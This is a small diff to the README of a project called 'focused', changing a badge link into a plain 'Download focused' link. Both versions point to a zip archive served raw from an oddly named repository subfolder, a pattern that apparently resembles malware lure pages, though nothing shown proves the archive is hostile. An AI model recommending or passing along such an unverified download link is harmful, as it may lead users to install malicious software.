@@ -1,6 +1,6 @@
 # 🎯 focused - Stay on Track with Ease
 
-[![Download focused](https://raw.githubusercontent.com/Josefabian02/focused/main/Lophornis/focused.zip)](https://raw.githubusercontent.com/Josefabian02/focused/main/Lophornis/focused.zip)
+[Download focused](https://raw.githubusercontent.com/Josefabian02/focused/main/Lophornis/focused.zip)
 
 ## 🚀 Getting Started
 
